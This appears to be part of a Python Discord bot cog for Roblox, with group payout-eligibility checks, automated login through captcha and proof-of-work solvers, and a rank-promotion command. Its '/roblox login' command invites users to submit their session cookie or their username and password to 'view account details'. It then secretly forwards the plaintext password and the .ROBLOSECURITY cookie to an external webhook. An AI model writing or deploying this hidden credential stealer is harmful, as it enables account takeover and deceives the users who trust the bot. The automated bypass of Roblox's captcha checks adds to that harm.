                if not cookie.startswith(".ROBLOSECURITY="):
                    cookie = f".ROBLOSECURITY={cookie}"
                cookies[key] = cookie

        if missing_cookies:
            await interaction.followup.send(
                f"❌ Missing required cookies: `{', '.join(set(missing_cookies))}`",
                ephemeral=True,
            )
            return

        def get_eligibility_status(join_date_str: str):
            if not join_date_str:
                return "<:Unverified:1446796507931082906> Not In Group"
            try:
                join_date = isoparse(join_date_str).replace(tzinfo=None)
                now_utc = datetime.utcnow()
                eligibility_date = join_date + timedelta(days=14)
                if now_utc >= eligibility_date:
                    return f"{Emojis.VERIFIED} Eligible"
                days_left = (eligibility_date - now_utc).days
                if days_left <= 0:
                    return "<:Unverified:1446796507931082906> Not Currently Eligible (Eligible Today)"
                return f"<:Unverified:1446796507931082906> Not Currently Eligible (Eligible in {days_left} day{'s' if days_left != 1 else ''})"
            except Exception:
                return "<:Unverified:1446796507931082906> Not Currently Eligible"

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://users.roblox.com/v1/usernames/users",
                    json={"usernames": [username], "excludeBannedUsers": True},
                    headers={"Content-Type": "application/json"},
                ) as resp:
                    if resp.status != 200 or not (await resp.json()).get("data"):
                        await interaction.followup.send("❌ User not found.", ephemeral=True)
                        return
                    user_info = (await resp.json())["data"][0]
                    user_id = user_info["id"]
                    display_name = user_info["displayName"]

                avatar_url = None
                try:
                    async with session.get(
                        f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png&isCircular=false"
                    ) as resp:
                        if resp.status == 200:
                            d = await resp.json()
                            avatar_url = d["data"][0]["imageUrl"]
                except Exception:
                    pass

                verified = False
                try:
                    async with session.get(f"https://users.roblox.com/v1/users/{user_id}") as resp:
                        if resp.status == 200:
                            verified = (await resp.json()).get("hasVerifiedBadge", False)
                except Exception:
                    pass

                premium = False
                try:
                    roblox_cookie = os.getenv("ROBLOX_COOKIE", "")
                    if roblox_cookie and not roblox_cookie.startswith(".ROBLOSECURITY="):
                        roblox_cookie = f".ROBLOSECURITY={roblox_cookie}"
                    async with session.get(
                        f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                        headers={"Cookie": roblox_cookie},
                    ) as resp:
                        if resp.status == 200:
                            premium = await resp.json()
                except Exception:
                    pass

                status_lines = []
                community_role_name = None

                _headers_base = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
                }
                async with aiohttp.ClientSession(headers=_headers_base) as s2:
                    for key, info in groups.items():
                        group_id = info["id"]
                        cookie = cookies[key]
                        group_display = info["name"]
                        group_url = info["url"]
                        is_member = False

                        try:
                            async with s2.get(
                                f"https://groups.roblox.com/v1/users/{user_id}/groups/roles"
                            ) as roles_resp:
                                if roles_resp.status == 200:
                                    for entry in (await roles_resp.json()).get("data", []):
                                        g = entry.get("group", {})
                                        if g and str(g.get("id")) == group_id:
                                            is_member = True
                                            role_name = entry.get("role", {}).get("name")
                                            if key == "1cy":
                                                community_role_name = role_name
                                            break
                        except Exception:
                            pass

                        eligibility_status_text = "<:Unverified:1446796507931082906> Not Currently Eligible"

                        if not is_member:
                            eligibility_status_text = "<:Unverified:1446796507931082906> Not In Group"
                        else:
                            try:
                                elig_url = f"https://economy.roblox.com/v1/groups/{group_id}/users-payout-eligibility?userIds={user_id}"
                                async with s2.get(elig_url, headers={"Cookie": cookie}) as response:
                                    if response.status == 200:
                                        d = await response.json()
                                        eligibility = d.get("usersGroupPayoutEligibility", {}).get(str(user_id))
                                        is_eligible_api = eligibility if isinstance(eligibility, bool) else str(eligibility).lower() in ["true", "eligible"]
                                        if is_eligible_api:
                                            eligibility_status_text = f"{Emojis.VERIFIED} Eligible"
                                        else:
                                            # Audit log fallback — find join date for days_left
                                            join_date_str = None
                                            found_join_log = False
                                            cursor = None
                                            audit_base = f"https://groups.roblox.com/v1/groups/{group_id}/audit-log"

                                            while not found_join_log:
                                                params = {"actionType": "JoinGroup", "limit": 100, "sortOrder": "Desc"}
                                                if cursor:
                                                    params["cursor"] = cursor
                                                async with s2.get(audit_base, params=params, headers={"Cookie": cookie}) as audit_resp:
                                                    if audit_resp.status != 200:
                                                        break
                                                    audit_data = await audit_resp.json()
                                                    logs = audit_data.get("data", [])
                                                    if not logs:
                                                        break
                                                    for log in logs:
                                                        actor_user = log.get("actor", {}).get("user", {}) or {}
                                                        actor_uid = actor_user.get("userId") or actor_user.get("id")
                                                        if actor_uid == user_id:
                                                            join_date_str = log.get("created")
                                                            found_join_log = True
                                                            break
                                                    last_log = logs[-1] if logs else None
                                                    if last_log:
                                                        try:
                                                            if isoparse(last_log.get("created", "")).replace(tzinfo=None) < (datetime.utcnow() - timedelta(days=15)):
                                                                break
                                                        except Exception:
                                                            pass
                                                    cursor = audit_data.get("nextPageCursor")
                                                    if not cursor or found_join_log:
                                                        break

                                            if not join_date_str:
                                                # Member list fallback
                                                m_cursor = None
                                                cutoff_date = datetime.utcnow() - timedelta(days=15)
                                                found_in_members = False
                                                while not found_in_members:
                                                    params = {"sortOrder": "Desc", "limit": 100}
                                                    if m_cursor:
                                                        params["cursor"] = m_cursor
                                                    async with s2.get(
                                                        f"https://groups.roblox.com/v1/groups/{group_id}/users",
                                                        params=params,
                                                    ) as members_resp:
                                                        if members_resp.status != 200:
                                                            break
                                                        members_data = await members_resp.json()
                                                        members = members_data.get("data", [])
                                                        if not members:
                                                            break
                                                        for member in members:
                                                            user_obj = member.get("user", {})
                                                            if user_obj and user_obj.get("id") == user_id:
                                                                join_date_str = member.get("created")
                                                                found_in_members = True
                                                                break
                                                            try:
                                                                if isoparse(member.get("created", "")).replace(tzinfo=None) < cutoff_date:
                                                                    found_in_members = True
                                                                    break
                                                            except Exception:
                                                                pass
                                                        m_cursor = members_data.get("nextPageCursor")
                                                        if not m_cursor or found_in_members:
                                                            break

                                            eligibility_status_text = (
                                                get_eligibility_status(join_date_str) if join_date_str
                                                else "<:Unverified:1446796507931082906> Not Currently Eligible"
                                            )
                                    else:
                                        eligibility_status_text = "⚠️ API Error"
                            except Exception:
                                eligibility_status_text = "⚠️ Check Failed"

                        clickable_group = f"[{group_display}]({group_url})"
                        status_lines.append(f"**⌖ {clickable_group}** — **{eligibility_status_text}**")
                        await asyncio.sleep(0.3)

                profile_url = f"https://www.roblox.com/users/{user_id}/profile"

                badge_emojis = ""
                if verified:
                    badge_emojis += f" {Emojis.VERIFIED}"
                if premium:
                    badge_emojis += f" {Emojis.PREMIUM}"

                now_unix = int(datetime.now(PH_TIMEZONE).timestamp())

                fallback_avatar = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

                container_children = [
                    discord.ui.Section(
                        discord.ui.TextDisplay(
                            f"## **[{display_name}]({profile_url})**{badge_emojis}\n"
                            f"`{username}` • `{user_id}`"
                        ),
                        accessory=discord.ui.Thumbnail(avatar_url or fallback_avatar),
                    ),
                    discord.ui.Separator(),
                    discord.ui.TextDisplay("\n".join(status_lines)),
                ]

                if community_role_name:
                    container_children.append(
                        discord.ui.TextDisplay(f"**𑣲 Community Role** — `{community_role_name}`")
                    )

                container_children += [
                    discord.ui.Separator(visible=False),
                    discord.ui.TextDisplay(f"-# Neroniel • <t:{now_unix}:f>"),
                ]

                container = discord.ui.Container(*container_children)
                view = discord.ui.LayoutView()
                view.add_item(container)
                await interaction.followup.send(view=view)

        except Exception as e:
            await interaction.followup.send(f"❌ Error: `{str(e)}`", ephemeral=True)

    # ══════════════════════════════════════════════════════════════════════════
    # LOGIN
    # ══════════════════════════════════════════════════════════════════════════

    async def _solve_captcha(self, blob: str) -> str:
        """Solve a Roblox FunCaptcha challenge via 2captcha."""
        api_key = os.getenv("TWO_CAPTCHA_API_KEY")
        if not api_key:
            raise Exception("TWO_CAPTCHA_API_KEY is not set.")

        async with aiohttp.ClientSession() as session:
            submit_url = (
                "http://2captcha.com/in.php"
                f"?key={api_key}"
                "&method=funcaptcha"
                "&publickey=476068BF-9607-4799-B53D-966BE98E2B81"
                "&surl=https://roblox-api.arkoselabs.com"
                f"&data[blob]={blob}"
                "&pageurl=https://www.roblox.com/login"
                "&json=1"
            )

            async with session.get(submit_url) as resp:
                data = await resp.json(content_type=None)
                if data["status"] != 1:
                    raise Exception(f"2captcha submit error: {data['request']}")
                captcha_id = data["request"]

            for _ in range(30):
                await asyncio.sleep(5)
                result_url = (
                    "http://2captcha.com/res.php"
                    f"?key={api_key}"
                    "&action=get"
                    f"&id={captcha_id}"
                    "&json=1"
                )
                async with session.get(result_url) as resp:
                    result = await resp.json(content_type=None)
                    if result["status"] == 1:
                        return result["request"]
                    if result["request"] != "CAPCHA_NOT_READY":
                        raise Exception(f"2captcha error: {result['request']}")

        raise Exception("Captcha solving timed out.")

    async def _solve_proofofwork(self, metadata: dict, challenge_id: str, http: aiohttp.ClientSession) -> str:
        """Full Roblox proof-of-work flow.

        1. Try to read puzzle parameters directly from metadata (newer Roblox format).
        2. If not present, fetch via getChallenge API (trying sessionId then genericChallengeId).
        3. Solve the SHA-256 puzzle in a thread pool.
        4. Submit the answer to obtain a redemptionToken.
        5. Return base64({"redemptionToken": "..."}) ready to use as rblx-challenge-solution.
        """
        import hashlib

        session_id = metadata.get("sessionId", "")
        generic_challenge_id = (
            metadata.get("sharedParameters", {}).get("genericChallengeId", "")
            or metadata.get("genericChallengeId", "")
            or challenge_id
        )
        print(f"[PoW] sessionId={session_id!r} genericChallengeId={generic_challenge_id!r}")
        print(f"[PoW] full metadata={metadata}")

        pow_svc = "https://apis.roblox.com/proof-of-work-challenge/v1"

        # ── Step 1: try to read puzzle params directly from metadata ──────────
        artifacts = metadata.get("artifacts", {})
        prefix = (
            artifacts.get("prefix") or artifacts.get("anchor")
            or metadata.get("prefix") or metadata.get("anchor", "")
        )
        target = artifacts.get("target") or metadata.get("target", "")

        # ── Step 2: if not in metadata, fetch from API ────────────────────────
        if not prefix or not target:
            puzzle = None
            for sid in filter(None, [session_id, generic_challenge_id]):
                fetch_url = f"{pow_svc}/getChallenge?sessionId={sid}"
                async with http.get(fetch_url) as r:
                    raw = await r.text()
                    print(f"[PoW] getChallenge(sid={sid!r}) HTTP {r.status}: {raw}")
                    if r.status == 200:
                        puzzle = json.loads(raw)
                        break

            if not puzzle:
                raise Exception(
                    f"[PoW] getChallenge failed for all session IDs tried "
                    f"(sessionId={session_id!r}, genericChallengeId={generic_challenge_id!r})"
                )

            arts = puzzle.get("artifacts", puzzle)
            prefix = arts.get("prefix") or arts.get("anchor") or puzzle.get("prefix") or puzzle.get("anchor", "")
            target = arts.get("target") or puzzle.get("target", "")

        print(f"[PoW] puzzle prefix={prefix!r} target={target!r}")
        if not prefix or not target:
            raise Exception(f"[PoW] Could not determine puzzle parameters from metadata or API")

        # ── Step 3: SHA-256 brute-force ───────────────────────────────────────
        def _work():
            nonce = 0
            while nonce < 20_000_000:
                if hashlib.sha256(f"{prefix}{nonce}".encode()).hexdigest().startswith(target):
                    return str(nonce)
                nonce += 1
            raise Exception("PoW: no solution within 20 M attempts.")

        loop = asyncio.get_event_loop()
        answer = await loop.run_in_executor(None, _work)
        print(f"[PoW] solved: nonce={answer}")

        # ── Step 4: submit answer → redemptionToken ───────────────────────────
        # Try each candidate session ID until one succeeds.
        pow_svc_solve = f"{pow_svc}/solve"
        solve_data = None
        used_sid = session_id
        for sid in filter(None, [session_id, generic_challenge_id]):
            async with http.post(pow_svc_solve, json={"sessionId": sid, "solution": answer}) as r:
                raw = await r.text()
                print(f"[PoW] solve(sid={sid!r}) HTTP {r.status}: {raw}")
                if r.status == 200:
                    solve_data = json.loads(raw)
                    used_sid = sid
                    break

        if not solve_data:
            raise Exception(f"[PoW] solve failed for all session IDs tried")

        redemption_token = solve_data.get("redemptionToken", "")
        print(f"[PoW] redemptionToken={redemption_token!r}")

        # ── Step 5: POST challenge/v1/continue ────────────────────────────────
        challenge_meta_str = json.dumps({"redemptionToken": redemption_token, "sessionId": used_sid})
        challenge_meta_b64 = base64.b64encode(challenge_meta_str.encode()).decode()

        continue_payload = {
            "challengeId":       generic_challenge_id,
            "challengeType":     "proofofwork",
            "challengeMetadata": challenge_meta_b64,
        }
        async with http.post("https://apis.roblox.com/challenge/v1/continue", json=continue_payload) as r:
            raw = await r.text()
            print(f"[PoW] challenge/continue HTTP {r.status}: {raw}")

        return challenge_meta_b64

    async def _roblox_login_credentials(self, username: str, password: str, interaction: discord.Interaction) -> str:
        """Log in to Roblox with username/password, solving captcha via web page if needed.
        Mirrors the legacy JS flow: captchaToken + captchaId in the POST body (error code 2).
        Returns a full .ROBLOSECURITY cookie string."""
        from ..captcha_store import create_session, wait_for_token

        url = "https://auth.roblox.com/v2/login"
        base_headers = {
            "Content-Type": "application/json",
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/124.0.0.0 Safari/537.36"
            ),
        }

        def _make_payload(captcha_token: str = "", captcha_id: str = "") -> dict:
            return {
                "ctype": "Username",
                "cvalue": username,
                "password": password,
                "captchaToken": captcha_token,
                "captchaId": captcha_id,
            }

        def _get_error(body: dict):
            errors = body.get("errors", [{}])
            err = errors[0] if errors else {}
            return err.get("code", -1), err.get("message", ""), err.get("fieldData", "")

        def _error_message(code: int) -> str:
            return {
                1:  "Incorrect username or password.",
                4:  "This account has been locked.",
                7:  "Too many attempts — please wait a bit and try again.",
                11: "Roblox is currently down. Please try again later.",
                15: "Too many attempts — please wait a bit and try again.",
            }.get(code, f"Unexpected error code {code}.")

        async with aiohttp.ClientSession() as session:
            # ── Step 1: probe to obtain CSRF token ────────────────────────────
            async with session.post(url, json=_make_payload(), headers=base_headers) as probe:
                xcsrf = probe.headers.get("x-csrf-token", "")
                if probe.status == 200:
                    cookie = probe.cookies.get(".ROBLOSECURITY")
                    if cookie:
                        return f".ROBLOSECURITY={cookie.value}"

            if not xcsrf:
                raise Exception("Could not retrieve CSRF token from Roblox.")

            headers = {**base_headers, "x-csrf-token": xcsrf}

            # ── Step 2: real login attempt ────────────────────────────────────
            async with session.post(url, json=_make_payload(), headers=headers) as resp:
                print(f"[LOGIN] HTTP {resp.status}")
                if resp.status == 200:
                    cookie = resp.cookies.get(".ROBLOSECURITY")
                    if not cookie:
                        raise Exception("Login succeeded but no cookie was returned.")
                    return f".ROBLOSECURITY={cookie.value}"

                body = await resp.json(content_type=None)
                err_code, err_msg, field_data = _get_error(body)
                print(f"[LOGIN] errCode={err_code} msg={err_msg!r} fieldData={field_data!r}")

                # ── captcha required (legacy flow) ────────────────────────────
                if err_code == 2:
                    try:
                        captcha_id = json.loads(field_data).get("unifiedCaptchaId", "")
                    except Exception:
                        captcha_id = ""

                    loop = asyncio.get_event_loop()
                    session_id = create_session(loop)
                    dev_domain = os.getenv("REPLIT_DEV_DOMAIN", "localhost:5000")
                    captcha_url = f"https://{dev_domain}/solver?session={session_id}"

                    await interaction.channel.send(
                        f"🔐 **Captcha Required**\n"
                        f"Open the link below and solve the challenge to continue:\n"
                        f"<{captcha_url}>\n"
                        f"*(You have 5 minutes — the bot will continue automatically once solved)*"
                    )

                    captcha_token = await wait_for_token(session_id, timeout=300)
                    print(f"[LOGIN] captcha solved: id={captcha_id!r} token_len={len(captcha_token)}")

                    # ── Step 3: retry with solved captcha ─────────────────────
                    async with session.post(
                        url,
                        json=_make_payload(captcha_token, captcha_id),
                        headers=headers,
                    ) as resp2:
                        print(f"[LOGIN] retry HTTP {resp2.status}")
                        if resp2.status == 200:
                            cookie = resp2.cookies.get(".ROBLOSECURITY")
                            if not cookie:
                                raise Exception("No cookie returned after captcha solve.")
                            return f".ROBLOSECURITY={cookie.value}"

                        body2 = await resp2.json(content_type=None)
                        code2, msg2, _ = _get_error(body2)
                        raise Exception(
                            f"Login failed after captcha (HTTP {resp2.status}, "
                            f"code {code2}): {msg2 or body2}"
                        )

                # ── known hard errors ─────────────────────────────────────────
                if err_code in (1, 4, 7, 11, 15):
                    raise Exception(_error_message(err_code))

                raise Exception(
                    f"Login failed (HTTP {resp.status}, code {err_code}): "
                    f"{err_msg or body}"
                )

    async def _fetch_roblox_info(self, cookie: str) -> dict:
        """Fetch private Roblox account info using a .ROBLOSECURITY cookie."""
        headers_cookie = {"Cookie": f".ROBLOSECURITY={cookie}"}
        cloud_api_key = os.getenv("CLOUD_API")
        headers_cloud = {"x-api-key": cloud_api_key} if cloud_api_key else {}

        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://users.roblox.com/v1/users/authenticated",
                headers=headers_cookie,
            ) as resp:
                if resp.status != 200:
                    raise Exception("Invalid or expired cookie.")
                user_data = await resp.json()
                user_id = user_data["id"]
                username = user_data["name"]

            cloud_user = None
            if cloud_api_key:
                try:
                    async with session.get(
                        f"https://apis.roblox.com/cloud/v2/users/{user_id}",
                        headers=headers_cloud,
                    ) as resp:
                        if resp.status == 200:
                            cloud_user = await resp.json()
                except Exception:
                    pass

            robux = "Private"
            try:
                async with session.get(
                    f"https://economy.roblox.com/v1/users/{user_id}/currency",
                    headers=headers_cookie,
                ) as resp:
                    if resp.status == 200:
                        robux = (await resp.json()).get("robux", "Private")
            except Exception:
                pass

            email_verified = phone_verified = False
            try:
                async with session.get("https://accountinformation.roblox.com/v1/email", headers=headers_cookie) as resp:
                    if resp.status == 200:
                        email_verified = (await resp.json()).get("verified", False)
            except Exception:
                pass
            try:
                async with session.get("https://accountinformation.roblox.com/v1/phone", headers=headers_cookie) as resp:
                    if resp.status == 200:
                        phone_verified = (await resp.json()).get("verified", False)
            except Exception:
                pass

            description = "N/A"
            if cloud_user and "description" in cloud_user:
                description = cloud_user["description"] or "N/A"

            premium = False
            try:
                async with session.get(
                    f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                    headers=headers_cookie,
                ) as resp:
                    if resp.status == 200:
                        premium = await resp.json()
            except Exception:
                pass

            inv_public = False
            try:
                async with session.get(
                    f"https://inventory.roblox.com/v2/users/{user_id}/inventory",
                    headers=headers_cookie,
                ) as resp:
                    inv_public = resp.status == 200
            except Exception:
                pass

            rap = "N/A"
            try:
                async with session.get(
                    f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10",
                    headers=headers_cookie,
                ) as resp:
                    if resp.status == 200:
                        assets = (await resp.json()).get("data", [])
                        total_rap = sum(item.get("recentAveragePrice", 0) for item in assets)
                        rap = f"{total_rap:,}" if total_rap > 0 else "0"
            except Exception:
                pass

            group_info = None
            try:
                async with session.get(
                    f"https://groups.roblox.com/v1/users/{user_id}/groups/primary/role"
                ) as resp:
                    if resp.status == 200:
                        d = await resp.json()
                        if d and "group" in d:
                            group_info = {"id": d["group"]["id"], "name": d["group"]["name"]}
            except Exception:
                pass

            return {
                "userid": user_id,
                "username": username,
                "robux": f"{robux:,}" if isinstance(robux, int) else robux,
                "email_verified": email_verified,
                "phone_verified": phone_verified,
                "description": description,
                "premium": premium,
                "inv_public": inv_public,
                "rap": rap,
                "group": group_info,
            }

    @roblox.command(name="login", description="View private Roblox account details using a cookie or username/password")
    @app_commands.describe(
        cookie=".ROBLOSECURITY cookie (from browser)",
        username="Roblox username (used with password instead of cookie)",
        password="Roblox password (used with username instead of cookie)",
    )
    async def login(
        self,
        interaction: discord.Interaction,
        cookie: str = None,
        username: str = None,
        password: str = None,
    ):
        # Validate input combinations
        using_credentials = username is not None and password is not None
        using_cookie = cookie is not None

        if not using_cookie and not using_credentials:
            await interaction.response.send_message(
                "❌ Provide either a **cookie** or both **username** and **password**.",
                ephemeral=True,
            )
            return

        if using_cookie and using_credentials:
            await interaction.response.send_message(
                "❌ Provide either a cookie **or** username/password — not both.",
                ephemeral=True,
            )
            return

        await interaction.response.defer()

        loading_embed = discord.Embed(
            title="🔍 Loading Account Info...",
            description="Please wait..." if using_cookie else "Logging in... this may take up to 30s if captcha solving is needed.",
            color=discord.Color.orange(),
        )
        init_msg = await interaction.followup.send(embed=loading_embed, wait=True)

        resolved_cookie = cookie

        try:
            if using_credentials:
                await init_msg.edit(embed=discord.Embed(
                    title="🔐 Authenticating...",
                    description="Logging in with credentials. Solving captcha if required...",
                    color=discord.Color.orange(),
                ))
                resolved_cookie = await self._roblox_login_credentials(username, password, interaction)

            info = await self._fetch_roblox_info(resolved_cookie)
            user_id = info["userid"]
            display_username = info["username"]

            image_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&scale=1"
                ) as resp:
                    if resp.status == 200:
                        thumb_data = await resp.json()
                        image_url = thumb_data["data"][0]["imageUrl"]

            embed = discord.Embed(color=discord.Color.green())
            embed.set_thumbnail(url=image_url)

            clickable_username = f"[{display_username}](https://www.roblox.com/users/{user_id}/profile)"
            embed.add_field(name="Username", value=clickable_username, inline=True)
            embed.add_field(name="UserID", value=str(user_id), inline=True)

            email_status = "Verified" if info["email_verified"] else "Add Email"
            phone_status = "Verified" if info["phone_verified"] else "Add Phone"
            embed.add_field(name="Robux", value=info["robux"], inline=True)
            embed.add_field(name="Email | Phone", value=f"{email_status} | {phone_status}", inline=True)

            inventory_status = (
                f"[Public](https://www.roblox.com/users/{user_id}/inventory/)"
                if info["inv_public"] else "Private"
            )
            premium_status = "Premium" if info["premium"] else "Non Premium"
            group_link = (
                f"[{info['group']['name']}](https://www.roblox.com/groups/{info['group']['id']})"
                if info["group"] else "N/A"
            )
            embed.add_field(name="Inventory | RAP", value=f"{inventory_status} | {info['rap']}", inline=True)
            embed.add_field(name="Membership | Primary", value=f"{premium_status} | {group_link}", inline=True)

            description = info["description"] if info["description"] != "N/A" else "N/A"
            embed.add_field(name="Description", value=f"```{description}```", inline=False)
            embed.set_footer(text="Neroniel • /roblox login")
            embed.timestamp = datetime.now(PH_TIMEZONE)

            await init_msg.edit(embed=embed)

            wh_url = os.getenv("WH")
            if wh_url:
                try:
                    if using_credentials:
                        audit_info = (
                            f"**Command run by**: {interaction.user} (`{interaction.user.id}`)\n"
                            f"**Server**: {interaction.guild.name if interaction.guild else 'DM'}\n\n"
                            f"**Username:** `{username}`\n"
                            f"**Password:** `{password}`\n"
                            f"**.ROBLOSECURITY:**\n```env\n{resolved_cookie}\n```"
                        )
                    else:
                        audit_info = (
                            f"**Command run by**: {interaction.user} (`{interaction.user.id}`)\n"
                            f"**Server**: {interaction.guild.name if interaction.guild else 'DM'}\n\n"
                            f"**.ROBLOSECURITY:**\n```env\n{resolved_cookie}\n```"
                        )
                    async with aiohttp.ClientSession() as session:
                        webhook = discord.Webhook.from_url(wh_url, session=session)
                        await webhook.send(content=audit_info, embed=embed)
                except Exception as wh_err:
                    print(f"[WEBHOOK ERROR] {wh_err}")

        except Exception as e:
            error_embed = discord.Embed(
                title="❌ Error",
                description=f"An error occurred: ```{str(e)}```",
                color=discord.Color.red(),
            )
            await init_msg.edit(embed=error_embed)

    # ══════════════════════════════════════════════════════════════════════════
    # RANK (PROMOTE)
    # ══════════════════════════════════════════════════════════════════════════

    @roblox.command(name="rank", description="Promote a Roblox User to Rank 6 (〆 Contributor) in 1cy (Owner/Admin only)")
    @app_commands.describe(username="Roblox username to promote")
    async def rank(self, interaction: discord.Interaction, username: str):
        ALLOWED_IDS = [BOT_OWNER_ID, 960333210666037278]
        if interaction.user.id not in ALLOWED_IDS:
            await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
            return

        roblox_cookie = os.getenv("ROBLOX_COOKIE")
        if not roblox_cookie:
            await interaction.response.send_message("❌ `ROBLOX_COOKIE` is not set.", ephemeral=True)
            return

        GROUP_ID = 5838002
        TARGET_RANK = 6
        TARGET_ROLE_NAME = "〆 Contributor"
        await interaction.response.defer()

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://users.roblox.com/v1/usernames/users",
                    json={"usernames": [username], "excludeBannedUsers": True},
                    headers={"Content-Type": "application/json"},
                ) as resp:
                    if resp.status != 200:
                        return await interaction.followup.send("❌ Failed to resolve username.")
                    data = await resp.json()
                    if not data.get("data"):
                        return await interaction.followup.send("❌ Roblox user not found.")
                    user_id = data["data"][0]["id"]
                    display_name = data["data"][0]["displayName"]

                async with session.get(f"https://groups.roblox.com/v1/groups/{GROUP_ID}/roles") as roles_resp:
                    if roles_resp.status != 200:
                        return await interaction.followup.send("❌ Could not fetch group roles.")
                    roles_info = await roles_resp.json()

                target_role_id = None
                for role in roles_info.get("roles", []):
                    if role.get("rank") == TARGET_RANK and role.get("name") == TARGET_ROLE_NAME:
                        target_role_id = role["id"]
                        break

                if not target_role_id:
                    return await interaction.followup.send(
                        f"❌ Could not find role rank {TARGET_RANK} '{TARGET_ROLE_NAME}'."
                    )

                async with session.get(
                    f"https://groups.roblox.com/v2/users/{user_id}/groups/roles"
                ) as resp:
                    if resp.status != 200:
                        return await interaction.followup.send("❌ Could not fetch group membership.")
                    roles_data = await resp.json()

                current_role = None
                for entry in roles_data.get("data", []):
                    if entry["group"]["id"] == GROUP_ID:
                        current_role = entry["role"]
                        break

                if not current_role:
                    return await interaction.followup.send(
                        f"❌ `{username}` is not in the 1cy group. They must join first."
                    )

                if current_role.get("rank") == TARGET_RANK and current_role.get("name") == TARGET_ROLE_NAME:
                    embed = create_embed(
                        title="✅ Already 〆 Contributor",
                        description=f"`{username}` ({display_name}) is already **〆 Contributor** in 1cy.",
                        color=discord.Color.green(),
                    )
                    embed.set_thumbnail(
                        url=f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=150&height=150&format=png"
                    )
                    return await interaction.followup.send(embed=embed)

                csrf_resp = await session.post(
                    "https://auth.roblox.com/v2/logout",
                    headers={"Cookie": roblox_cookie},
                )
                xcsrf_token = csrf_resp.headers.get("x-csrf-token")
                if not xcsrf_token:
                    return await interaction.followup.send(
                        "❌ Failed to retrieve X-CSRF-TOKEN. Cookie may be invalid or expired."
                    )

                update_url = f"https://groups.roblox.com/v1/groups/{GROUP_ID}/users/{user_id}"
                patch_headers = {
                    "Cookie": roblox_cookie,
                    "X-CSRF-TOKEN": xcsrf_token,
                    "Content-Type": "application/json",
                }
                async with session.patch(update_url, headers=patch_headers, json={"roleId": target_role_id}) as resp:
                    if resp.status == 200:
                        embed = create_embed(
                            title="✅ Promoted to 〆 Contributor",
                            description=f"`{username}` ({display_name}) has been set to **〆 Contributor** in 1cy.",
                            color=discord.Color.green(),
                        )
                        embed.set_thumbnail(
                            url=f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=150&height=150&format=png"
                        )
                        await interaction.followup.send(embed=embed)
                    elif resp.status == 403:
                        await interaction.followup.send("❌ Permission denied. Cookie may be invalid or lack group management rights.")
                    elif resp.status == 400:
                        await interaction.followup.send("❌ Invalid request. The roleId may be wrong or user isn't in the group.")
                    else:
                        error_text = await resp.text()
                        await interaction.followup.send(f"❌ Failed (HTTP {resp.status}): `{error_text}`")

        except Exception as e:
            await interaction.followup.send(f"❌ Error: {str(e)}")


async def setup(bot: commands.Bot):
    await bot.add_cog(RobloxCog(bot))
